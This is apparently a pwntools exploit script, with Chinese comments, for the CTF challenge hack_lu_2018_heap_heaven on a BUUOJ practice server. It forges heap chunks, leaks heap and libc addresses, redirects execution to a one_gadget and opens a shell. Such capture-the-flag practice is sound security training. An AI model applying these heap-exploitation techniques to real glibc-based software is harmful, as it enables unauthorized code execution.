# coding:utf-8
from pwn import *
from LibcSearcher import *
import pwnlib
context.log_level = 'debug'
elf = ELF ("./hack_lu_2018_heap_heaven")
sh = process("./hack_lu_2018_heap_heaven")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh = remote("node3.buuoj.cn",27883)
malloc_hook_s = libc.symbols['__malloc_hook']

one_gadget = 0xf02a4
def write(size,offset,content):
    sh.recvuntil("[5] : exit\n")
    sh.sendline("1")
    sh.recvuntil("How much do you want to write?\n")
    sh.sendline(str(size))
    sh.recvuntil("At which offset?")
    sh.sendline(str(offset))
    sleep(0.1)
    sh.send(content)

def free(offset):
    sh.recvuntil("[5] : exit\n")
    sh.sendline("3")
    sh.recvuntil("At which offset do you want to free?\n")
    sh.sendline(str(offset))

def leak(offset):
    sh.recvuntil("[5] : exit\n")
    sh.sendline("4")
    sh.recvuntil("At which offset do you want to leak?")
    sh.sendline(str(offset))

def ts():
    gdb.attach(sh)
    pause()
#如果当前free的chunk的下一个相邻的chunk处于inuse状态，清除当前chunk的inuse状态，反之则发生合并，所以在这里需要构造3个fake_chunk，如果构造三个以下的chunk则会抛出异常return INLINE_SYSCALL (tgkill, 3, pid, selftid, sig);
payload = p64(0) + p64(0x91) + 'a' * 0x80 + p64(0) + p64(0x21) + 'b' * 0x10 + p64(0) + p64(0x21) + 'c' * 0x10
write(len(payload),0,payload)
free(0x10)
leak(0x10)
sh.recvuntil("\n")
heap_addr = u64(sh.recv(6).ljust(8,"\x00"))
log.info("success leak heap_addr(current top chunk):0x%x"%heap_addr)
payload = p8(0x89)
write(1,0x10,payload)
leak(0x10)
sh.recvuntil("\n")
mmapped = u64('\x00' + sh.recvuntil('\n',drop = True).ljust(7,'\x00'))
log.info("success leak mmapped:0x%x"%mmapped)
payload = p8(0x98)
write(1,0x10,payload)
leak(0x10)
sh.recvuntil("\n")
libc_offset =  u64(sh.recv(6).ljust(8,"\x00"))
log.info("success leak libc_offset:0x%x"%libc_offset)
malloc_addr = (libc_offset & 0xfffffffffffff000) + (malloc_hook_s & 0xfff)
log.info("success get malloc_hook_addr:0x%x"%malloc_addr)
libc_base = malloc_addr - malloc_hook_s
log.info("success get libc_base_addr:0x%x"%libc_base)
payload = p64(0) + p64(0x21) + 'a' * 0x10 + p64(0) + p64(0x21) + 'a' * 0x10 
write(len(payload),0,payload)
free(0x10)
one_gadget_addr = libc_base + one_gadget
write(0x8,8,p64(one_gadget_addr)) #布置虚表指针
# ts()
state_addr = heap_addr - 0x30
log.info("aaaaaaa:0x%x"%(state_addr - mmapped))
free(state_addr - mmapped)
sh.interactive()